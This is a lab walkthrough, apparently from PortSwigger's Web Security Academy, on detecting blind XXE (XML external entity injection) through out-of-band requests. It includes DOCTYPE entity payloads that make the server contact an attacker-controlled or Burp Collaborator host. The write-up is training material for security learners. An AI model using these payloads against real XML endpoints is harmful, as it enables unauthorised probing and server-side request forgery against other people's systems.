## Overview :

 You can often detect blind XXE using the same technique as for XXE SSRF attacks but **triggering the out-of-band network interaction** to a system that you control. For example, you would define an external entity as follows:

 ```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```
You would then make use of the defined entity in a data value within the XML.

This XXE attack causes the server to make a back-end HTTP request to the specified URL. The attacker can monitor for the resulting DNS lookup and HTTP request, and thereby detect that the XXE attack was successful. 

## Solution :

Clicking on checkstock feature send the following request, 

```xml
POST /product/stock HTTP/1.1
Host: 0a5500920363ef3783ca2e3900dd000f.web-security-academy.net

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>
```
To solve the lab we need to make an out bound request to our collaborator server to solve the lab.

For this we can use the following payload

```xml
<!DOCTYPE root [<!ENTITY  % ext SYSTEM "http://burp-collaborator.net/">]>
<stockCheck>
  <productId>%ext;</productId>
  <storeId>1</storeId>
</stockCheck>
```
But in the response we get an error stating that - `Entities are not allowed for security reasons`

So instead of using parameterized entities, we use normal entities.

The response states - `Invalid product ID` which is an indicator that there is no productID but still the application may have parsed the entity and made out-bound request to our burp collaborator server.

Now in our collaborator server, we can see that we have some DNS & HTTP requests made .

We have thus solved the lab.
